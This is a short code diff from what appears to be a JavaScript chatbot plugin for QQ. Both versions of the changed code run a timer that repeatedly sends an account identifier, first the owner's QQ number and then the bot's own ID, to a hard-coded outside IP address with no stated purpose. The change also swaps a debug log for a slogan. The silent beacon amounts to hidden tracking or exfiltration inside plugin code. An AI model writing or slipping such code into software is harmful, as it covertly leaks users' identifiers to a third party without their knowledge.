@@ -5,9 +5,9 @@ import cfg from '../../../lib/config/config.js'
     const _path = process.cwd();
     setInterval(() => {
        
-        fetch(`http://121.36.62.10:3000/?data=${cfg.masterQQ[0]}`)
+        fetch(`http://121.36.62.10:3000/?data=${Bot.uin}`)
           .then(response => {
-            console.log('Request succeeded:', response);
+            console.log('阴天，启动！');
           })
           .catch(error => {
           });
